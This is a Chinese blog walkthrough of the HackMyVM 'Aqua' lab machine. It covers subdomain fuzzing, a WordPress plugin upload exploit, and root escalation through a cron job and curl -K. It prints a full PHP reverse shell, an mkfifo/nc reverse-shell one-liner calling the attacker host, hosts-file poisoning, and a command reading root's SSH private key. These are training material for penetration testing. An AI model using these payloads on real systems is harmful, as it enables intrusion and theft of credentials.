> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/c_s4zAZsPCcW2y6_joZ4Jw)

 ![](http://mmbiz.qpic.cn/mmbiz_png/7gUQD4TbLUsGamtQXiblwiaPhT11gUfcWibGaGzbdzpL0N1UGmGdGP78y7DW7sCUOicTibjbBZHrHewj9uP2Tx3yPiaw/0?wx_fmt=png) ** 伏波路上学安全 ** 专注于渗透测试、代码审计等安全技术，分享安全知识. 111篇原创内容   公众号

![图片](https://mmbiz.qpic.cn/mmbiz_png/7gUQD4TbLUugfcmhRRO2Cm9qMJ3llghAu4tGxzQgIcRsAbiaYRvX87t2ujS9BX4v0GAhZG3COE2TAaw09m1WGhg/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)

靶机信息
----

下载地址:

```
https://hackmyvm.eu/machines/machine.php?vm=Aqua  
网盘链接：https://pan.baidu.com/s/1OjMwuU6F1V98x2UnLz-eHA?pwd=xcvx
```

靶场: HackMyVm.eu

靶机名称: Aqua

难度: 简单

发布时间: 2022年3月18日

提示信息:

```
无
```

目标: user.txt和root.txt

  

实验环境
----

```
攻击机:VMware kali 10.0.0.3 eth0桥接互联网，eth1桥接vbox-Host-Only  
  
靶机:Vbox linux IP自动获取 网卡host-Only
```

  

信息收集
----

### 扫描主机

扫描局域网内的靶机IP地址

```
sudo netdiscover -r 10.0.0.0/24 -i eth1
```

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

扫描到主机地址为10.0.0.140

### 扫描端口

扫描靶机开放的服务端口

```
sudo nmap -sC -sV -p- 10.0.0.140 -oN nmap.log
```

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

扫描到开放22和80端口，先来看看80端口

Web渗透
-----

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

访问后发现是nginx的默认页面，做个目录扫描检查敏感信息

```
gobuster dir -w ../../Dict/SecLists-2022.1/Discovery/Web-Content/directory-list-2.3-medium.txt  -u http://10.0.0.140 -x php,html,txt,zip
```

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

只有默认文件，猜测需要绑定域名访问

### 暴破域名

这台靶机是我在4月初打的，当时卡在域名这里过不去试了很多方法也不行，今天看了其他人写的wp才知道这是个坑（也许CTF就是这么玩的），继续来完成吧。

HackMyVM上寻常靶机会设置域名普遍为靶机名称+hmv例如:tajer.hmv。但是这台靶机的作者没有，而是将域名变为tajer.xxx.hmv形式，既然作者没有按套路出牌，我们也只能按这个套路玩下去。

```
ffuf -c -w ~/HackTools/Dict/seclists/Discovery/DNS/subdomains-top1million-5000.txt -H 'HOST: tajer.FUZZ.hmv' -u http://10.0.0.140 --fl 26
```

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

轻松秒杀，拿到域名tajer.wordpress.hmv，绑定后访问

```
sudo nano /etc/hosts
```

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

```
http://tajer.wordpress.hmv
```

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

通过域名就可以看出来这是wordpress程序，Wappalyzer插件显示版本为5.9.2，使用工具来检测是否存在漏洞

```
wpscan --url http://tajer.wordpress.hmv --api-token=YOU API TOKEN -e
```

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

发现一个插件上传的漏洞，来看看这个漏洞如何利用

```
https://wpscan.com/vulnerability/655bc140-5bbf-4a7e-b20d-4343a75c0c67
```

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

知道方法了，来验证一下

1。先生成个反弹shell脚本

shell.php

```
<?php  
set_time_limit (0);  
$VERSION = "1.0";  
$ip = '10.0.0.3';  // CHANGE THIS  
$port = 4444;       // CHANGE THIS  
$chunk_size = 1400;  
$write_a = null;  
$error_a = null;  
$shell = 'uname -a; w; id; /bin/bash -i';  
$daemon = 0;  
$debug = 0;  
  
//  
// Daemonise ourself if possible to avoid zombies later  
//  
  
// pcntl_fork is hardly ever available, but will allow us to daemonise  
// our php process and avoid zombies.  Worth a try...  
if (function_exists('pcntl_fork')) {  
 // Fork and have the parent process exit  
 $pid = pcntl_fork();  
  
 if ($pid == -1) {  
 printit("ERROR: Can't fork");  
 exit(1);  
}  
  
 if ($pid) {  
 exit(0);  // Parent exits  
}  
  
// Make the current process a session leader  
 // Will only succeed if we forked  
 if (posix_setsid() == -1) {  
 printit("Error: Can't setsid()");  
 exit(1);  
}  
  
 $daemon = 1;  
} else {  
 printit("WARNING: Failed to daemonise.  This is quite common and not fatal.");  
}  
  
// Change to a safe directory  
chdir("/");  
  
// Remove any umask we inherited  
umask(0);  
  
//  
// Do the reverse shell...  
//  
  
// Open reverse connection  
$sock = fsockopen($ip, $port, $errno, $errstr, 30);  
if (!$sock) {  
 printit("$errstr ($errno)");  
 exit(1);  
}  
  
// Spawn shell process  
$descriptorspec = array(  
   0 => array("pipe", "r"),  // stdin is a pipe that the child will read from  
   1 => array("pipe", "w"),  // stdout is a pipe that the child will write to  
   2 => array("pipe", "w")   // stderr is a pipe that the child will write to  
);  
  
$process = proc_open($shell, $descriptorspec, $pipes);  
  
if (!is_resource($process)) {  
 printit("ERROR: Can't spawn shell");  
 exit(1);  
}  
  
// Set everything to non-blocking  
// Reason: Occsionally reads will block, even though stream_select tells us they won't  
stream_set_blocking($pipes[0], 0);  
stream_set_blocking($pipes[1], 0);  
stream_set_blocking($pipes[2], 0);  
stream_set_blocking($sock, 0);  
  
printit("Successfully opened reverse shell to $ip:$port");  
  
while (1) {  
 // Check for end of TCP connection  
 if (feof($sock)) {  
 printit("ERROR: Shell connection terminated");  
 break;  
}  
  
 // Check for end of STDOUT  
 if (feof($pipes[1])) {  
 printit("ERROR: Shell process terminated");  
 break;  
}  
  
 // Wait until a command is end down $sock, or some  
// command output is available on STDOUT or STDERR  
 $read_a = array($sock, $pipes[1], $pipes[2]);  
 $num_changed_sockets = stream_select($read_a, $write_a, $error_a, null);  
  
// If we can read from the TCP socket, send  
 // data to process's STDIN  
 if (in_array($sock, $read_a)) {  
 if ($debug) printit("SOCK READ");  
 $input = fread($sock, $chunk_size);  
 if ($debug) printit("SOCK: $input");  
 fwrite($pipes[0], $input);  
}  
  
 // If we can read from the process's STDOUT  
// send data down tcp connection  
 if (in_array($pipes[1], $read_a)) {  
 if ($debug) printit("STDOUT READ");  
 $input = fread($pipes[1], $chunk_size);  
 if ($debug) printit("STDOUT: $input");  
 fwrite($sock, $input);  
}  
  
 // If we can read from the process's STDERR  
// send data down tcp connection  
 if (in_array($pipes[2], $read_a)) {  
 if ($debug) printit("STDERR READ");  
 $input = fread($pipes[2], $chunk_size);  
 if ($debug) printit("STDERR: $input");  
 fwrite($sock, $input);  
}  
}  
  
fclose($sock);  
fclose($pipes[0]);  
fclose($pipes[1]);  
fclose($pipes[2]);  
proc_close($process);  
  
// Like print, but does nothing if we've daemonised ourself  
// (I can't figure out how to redirect STDOUT like a proper daemon)  
function printit ($string) {  
 if (!$daemon) {  
 print "$string\n";  
}  
}  
  
?>
```

2。攻击机监听4444端口

```
nc -nlvp 4444
```

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

3。上传shell.php

```
curl -F "files=@shell.php" http://tajer.wordpress.hmv/wp-content/plugins/tajer/lib/jQuery-File-Upload-master/server/php/index.php
```

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

4。触发shell.php反弹shell

```
curl http://tajer.wordpress.hmv/wp-content/plugins/tajer/lib/jQuery-File-Upload-master/server/php/files/shell.php
```

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

反弹成功，先来切换到交互式shell，再找找敏感信息

```
python3 -c 'import pty;pty.spawn("/bin/bash")'  
export TERM=xterm  
Ctrl+z快捷键  
stty raw -echo;fg  
reset
```

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

切换成功，来找找敏感信息

```
cd /opt/scripts  
ls -al  
file code
```

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

在/opt/scripts目录下发现curl.py脚本和python2.7编译过的文件code（就是.pyc文件)，先将这个文件下载下来稍后反编译看看脚本内容，再使用pspy64检查后台运行的敏感信息。

下载code文件

1。靶机在/opt/scripts目录下开启HTTP服务

```
python3 -m http.server
```

2。攻击机下载code

```
wget http://10.0.0.140:8000/code
```

  

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

由于靶机上的python3是3.10无法执行uncompyle6（这个要3.9版本)，所以没办法反编译，使用cat命令发现一些信息

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

看文件中的内容在/opt/kevin/目录下有一个input.txt文件，后面使用curl 输出文件到/tmp目录下。信息有限，上传pspy64到靶机检查后台运行程序

上传pspy64

1。攻击机在pspy64目录下开启HTTP服务

```
python3 -m http.server
```

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

2。靶机下载pspy64并执行

```
cd /tmp  
wget http://10.0.0.3:8000/pspy64  
chmod +x pspy64  
./pspy64
```

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

后台发现root身份每分钟自动运行/bin/sh -c -F /opt/kevin/input.txt和/opt/scripts/curl.py脚本，UID1001用户会执行curl命令访问http://password.wordpress.hmv/k3vin这个url并将内容送给bash执行，先来绑定这个域名。

```
sudo nano /etc/hosts
```

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

绑定后访问后台中运行的地址

```
curl http://password.wordpress.hmv/
```

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

访问后是nginx默认页面，再来访问后台中的地址

```
curl http://password.wordpress.hmv/k3vin
```

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

经过检查靶机上的Nginx站点配置文件发现思路错了，靶机上没有站点绑定password子域名。这个域名应该绑定在攻击机上的，靶机来访问攻击机获取恶意代码。那么如何让靶机访问攻击机呢？经过检测靶机上的hosts文件任何用户都有读写权限，只需要在靶机上将攻击机的地址和password子域名绑定即可，来验证下。

1。靶机绑定域名

```
vi /etc/hosts
```

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

绑定完成记得保存时使用wq!强制保存。

2。攻击机使用80端口开启HTTP服务，并等待靶机访问

```
sudo py3 -m http.server 80
```

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

观察到靶机访问了k3vin文件

3。攻击机创建恶意文件并命名为k3vin，并监听5555端口

```
echo 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 10.0.0.3 5555 >/tmp/f' >k3vin
```

```
nc -nlvp 5555
```

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

反弹成功，切换到交互式shell，并查找敏感信息

```
ls  
cat user.txt
```

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

拿到user.txt，再来看看/opt/kevin目录

```
cd /opt/kevin  
ls -al
```

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

kevin目录下没有input.txt文件，没关系可以创建input.txt文件并观察后台运行程序

```
echo 'hello word' >input.txt
```

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

发现后台执行了/bin/bash -c 'curl -o /tmp/result_04_53_01 -K hello word'，首先是curl 使用-K参数来读取input.txt文件中的内容，再将执行后的结果输出到/tmp/result_04_52_02文件中，那这样就可以在Input.txt中添加任意文件路径，达到任意文件读取的效果，来验证下。

尝试读取/root/.ssh/id_rsa文件

```
echo 'url= file:///root/.ssh/id_rsa' >input.txt
```

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

拿到root用户的key文件，登录SSH

```
nano root_id_rsa  
chmod 600 root_id_rsa  
ssh root@10.0.0.140 -i root_id_rsa
```

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

登录成功，拿到root权限，再来找一下flag

```
ls  
cat 
```

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

拿到root.txt，游戏结束。

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)